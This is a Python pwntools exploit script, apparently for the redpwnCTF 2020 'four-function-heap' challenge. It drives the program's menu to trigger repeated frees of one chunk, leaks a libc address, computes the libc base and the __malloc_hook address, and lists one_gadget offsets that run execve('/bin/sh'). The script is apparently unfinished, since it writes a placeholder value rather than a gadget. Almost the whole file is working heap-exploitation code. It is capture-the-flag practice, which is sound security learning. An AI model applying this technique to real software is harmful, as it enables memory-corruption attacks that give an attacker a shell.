from pwn import *

def new(size, contents):
    p.sendlineafter(':', '1')
    p.sendlineafter(':', '0')
    p.sendlineafter(':', str(size))
    p.sendlineafter(':', contents)

def delete():
    p.sendlineafter(':', '2')
    p.sendlineafter(':', str('0'))

def show():
    p.sendlineafter(':', '3')
    p.sendlineafter(':', str('0'))
    return p.recvuntil('free}}')

context.update(log_level='debug')
p = process('bin/four-function-heap')
#p = remote('2020.redpwnc.tf', 31774)

new(300, 'A'*299) #0
delete() #1

#dummy chunk
new(100, 'B'*99) #2

new(300, 'C'*299)#3
for i in range(8):
    delete() #11
addr_libc = u64(show().split('{{')[0][-7:-1].ljust(8, '\x00')) #12


log.info('libc: ' + hex(addr_libc))
offset_libc = 0x3ebca0
addr_libc_base = addr_libc - offset_libc
log.info('libc: ' + hex(addr_libc_base))


offset_mallocHook = 0x3ebc30
addr_mallocHook = addr_libc_base + offset_mallocHook
log.info('__malloc_hook: ' + hex(addr_mallocHook))


raw_input('debug:' + str(p.pid))
#new(300, p64(addr_mallocHook)*(299/8)) 
new(30, p64(addr_mallocHook)+p64(0)) #13
new(300, p64(0xdeadbeefdeadbeef)) #14
#new(30, 'test')
'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''


p.interactive()


